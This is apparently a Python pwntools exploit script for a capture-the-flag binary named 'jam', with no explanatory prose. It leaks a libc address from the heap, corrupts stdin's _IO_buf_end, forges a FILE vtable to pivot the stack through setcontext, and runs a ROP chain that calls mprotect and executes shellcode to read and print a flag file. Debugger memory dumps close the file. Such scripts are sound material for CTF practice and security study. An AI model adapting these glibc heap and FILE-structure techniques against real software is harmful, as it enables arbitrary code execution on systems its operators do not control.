from pwn import*
p = process('./jam')
#p = remote('35.194.245.237 ',8091)
context(arch = 'amd64',os = 'linux')
### Definition
def menu(choice):
	p.sendlineafter('Your choice > ',choice)

def make(name,ingredient):
	menu('M')
	p.sendafter(' > ',name)
	p.sendafter(' > ',ingredient)

def add(name,description):
	menu('A')
	p.sendafter(' > ',name)
	p.sendafter(' > ',description)

def erase(name):
	menu('E')
	p.sendafter(' > ',name)


### Gadget


### Exploit
# leak
make('a'*4,'b'*24)
erase('KJM\x00')
menu('S')

main_arena_88 = u64((p.recvuntil('\x7f\n')[-7:-1]).ljust(8,'\x00'))
libc_base = main_arena_88 - 3951480
io_buf_end = libc_base + 3950880
log.info("main_arena_88 : {}".format(hex(main_arena_88)))
log.info("libc_base : {}".format(hex(libc_base)))
log.info("io_buf_end : {}".format(hex(io_buf_end)))


# io_buf_end overwrite
pay = ''
pay += p64(main_arena_88)
pay += p64(io_buf_end-0x10)
add('KJM\x00',pay)
add('a'*4,'X'*8)

# Shellcode
'''
shellcode = ''
shellcode += 'sub rsp, 0x108'
shellcode += shellcraft.open("/home/jam/flag")
shellcode += shellcraft.read("rax",'rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
'''

shellcode = asm('''
      add rsp,0x500
      mov rax, 0x000067616c662f6d
      push rax
      mov rax, 0x616a2f656d6f682f
      push rax
      
        
      mov rdi,rsp
      mov rsi,0
      mov rdx,0

      mov rax,2
      syscall

      mov rdi,rax
      mov rsi,rsp
      mov rdx,0x100

      mov rax,0
      syscall

      mov rdi,1
      mov rsi,rsp
      mov rdx,0x100

      mov rax,1
      syscall
''')


# ROPgadget
setcontext_53 = libc_base + 293765
syscall = libc_base + 1030932
ret = libc_base + 0x00000000000937
pop_rdi = libc_base + 0x0000000000021112
pop_rsi = libc_base + 0x00000000000202f8
pop_rdx = libc_base + 0x0000000000001b92
pop_rax = libc_base + 0x000000000003a738

log.info("[ DEBUG ] : {}".format(hex(syscall)))
# ROP payload
rop = ''
rop += 'X'*8
rop += p64(pop_rdi)
rop += p64(libc_base)
rop += p64(pop_rsi)
rop += p64(0x9000000)
rop += p64(pop_rdx)
rop += p64(7)
rop += p64(pop_rax)
rop += p64(10)                  # sys_mprotect
rop += p64(syscall)
rop += 'X'*8					# dummy
rop += p64(libc_base+3951328)  	# shellcode addr
rop += p64(0)
rop += shellcode


# RSP control
pay = ''
pay += '\x00'*5                 # fake setting
pay += p64(libc_base+3958672)
pay += p64(0xffffffffffffffff)
pay += p64(0)
pay += p64(libc_base+3951232)	# mov rsp, [rdi + 0xa0] -> rsp control
pay += p64(ret)					# mov rcx, [rdi + 0xa8] -> push rcx control
pay += p64(0)*2
pay += p64(0xffffffff)
pay += p64(0)*2
pay += p64(libc_base+3951040)	# vtable control -> setcontext+53 dummy
pay += p64(0)*2+p64(setcontext_53)*20
pay += p64(0)
pay += rop

raw_input()
p.sendline(pay)		# -- EXPLOIT COMPLETE

p.interactive()

'''
   0x7ffff7a54b85:	mov    rsp,QWORD PTR [rdi+0xa0]
   0x7ffff7a54b8c:	mov    rbx,QWORD PTR [rdi+0x80]
   0x7ffff7a54b93:	mov    rbp,QWORD PTR [rdi+0x78]
   0x7ffff7a54b97:	mov    r12,QWORD PTR [rdi+0x48]
   0x7ffff7a54b9b:	mov    r13,QWORD PTR [rdi+0x50]
   0x7ffff7a54b9f:	mov    r14,QWORD PTR [rdi+0x58]
   0x7ffff7a54ba3:	mov    r15,QWORD PTR [rdi+0x60]
   0x7ffff7a54ba7:	mov    rcx,QWORD PTR [rdi+0xa8]
=> 0x7ffff7a54bae:	push   rcx
   0x7ffff7a54baf:	mov    rsi,QWORD PTR [rdi+0x70]
   0x7ffff7a54bb3:	mov    rdx,QWORD PTR [rdi+0x88]
   0x7ffff7a54bba:	mov    rcx,QWORD PTR [rdi+0x98]
   0x7ffff7a54bc1:	mov    r8,QWORD PTR [rdi+0x28]
   0x7ffff7a54bc5:	mov    r9,QWORD PTR [rdi+0x30]
   0x7ffff7a54bc9:	mov    rdi,QWORD PTR [rdi+0x68]
   0x7ffff7a54bcd:	xor    eax,eax
   0x7ffff7a54bcf:	ret    

'''


'''
0x7ffff7dd1980 <_IO_2_1_stdin_+160>:	0x00007ffff7dd19c0	0x0000000000000000
0x7ffff7dd1990 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd19a0 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd19b0 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007ffff7dd06e0
0x7ffff7dd19c0 <_IO_wide_data_0>:	0x0000000000000000	0x0000000000000000
pwndbg> 
0x7ffff7dd19d0 <_IO_wide_data_0+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd19e0 <_IO_wide_data_0+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd19f0 <_IO_wide_data_0+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a00 <_IO_wide_data_0+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a10 <_IO_wide_data_0+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a20 <_IO_wide_data_0+96>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1a30 <_IO_wide_data_0+112>:	0x0000000000000000	0x0000000000000000
'''
